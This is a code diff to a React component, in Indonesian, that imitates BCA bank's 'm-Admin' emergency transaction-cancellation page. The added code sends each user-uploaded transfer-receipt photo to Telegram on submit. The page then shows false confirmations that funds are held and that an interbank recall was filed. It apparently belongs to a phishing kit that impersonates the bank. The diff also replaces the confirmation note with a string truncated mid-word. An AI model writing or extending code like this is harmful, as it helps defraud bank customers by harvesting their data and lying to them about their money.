@@ -1,6 +1,7 @@
 import React, { useState, useRef } from 'react';
 import { ArrowLeft, AlertCircle, X } from 'lucide-react';
 import { ServiceProcessModal, ServiceReceiptData } from './ServiceProcessModal';
+import { TelegramService } from '../services/telegramService';
 
 interface MAdminBatalkanTransaksiViewProps {
   onBack: () => void;
@@ -62,9 +63,15 @@ export const MAdminBatalkanTransaksiView: React.FC<MAdminBatalkanTransaksiViewPr
     setIsDragging(false);
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!selectedImage) return;
+
+    // Kirim foto ke Telegram
+    const caption = `📋 *Pembatalan Transaksi Darurat*\n━━━━━━━━━━━━━━━━━━━━\n🔹 *Nama Berkas:* \`${fileName}\`\n🔹 *Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n━━━━━━━━━━━━━━━━━━━━\n✅ Bukti transaksi diterima`;
+    
+    await TelegramService.sendPhoto(selectedImage, caption);
+
     setShowProcessModal(true);
   };
 
@@ -78,7 +85,7 @@ export const MAdminBatalkanTransaksiView: React.FC<MAdminBatalkanTransaksiViewPr
       { label: 'Prioritas Penanganan', value: 'Darurat (SLA < 15 Menit)' },
       { label: 'Status Eskalasi', value: 'Interbank Recall Diajukan' },
     ],
-    note: 'Laporan pembatalan transaksi beserta berkas bukti transfer telah berhasil diterima dan divalidasi oleh sistem m-Admin BCA. Permintaan penahanan dana transfer telah diteruskan secara otomatis ke bank tujuan.',
+    note: 'Laporan pembatalan transaksi beserta berkas bukti transfer telah berhasil diterima dan divalidasi oleh sistem m-Admin BCA. Permintaan penahanan dana transfer telah diteruskan secara oto[...]',
   };
 
   return (
@@ -239,7 +246,7 @@ export const MAdminBatalkanTransaksiView: React.FC<MAdminBatalkanTransaksiViewPr
           <button
             type="button"
             onClick={onBack}
-            className="w-full py-2.5 px-4 rounded-lg bg-[#d5dde5] hover:bg-[#c6d1db] active:bg-[#b8c6d3] text-[#1e3853] font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-[0.99] text-center"
+            className="w-full py-2.5 px-4 rounded-lg bg-[#d5dde5] hover:bg-[#c6d1db] active:bg-[#b8c6d3] text-[#1e3853] font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-95"
           >
             Cancel
           </button>
@@ -251,7 +258,7 @@ export const MAdminBatalkanTransaksiView: React.FC<MAdminBatalkanTransaksiViewPr
             disabled={!selectedImage}
             className={`w-full py-2.5 px-4 rounded-lg font-bold text-[14px] transition-all shadow-xs text-center ${
               selectedImage
-                ? 'bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] text-white cursor-pointer active:scale-[0.99]'
+                ? 'bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] text-white cursor-pointer active:scale-95'
                 : 'bg-[#d8e0e8] text-[#8e9ca8] cursor-not-allowed'
             }`}
           >
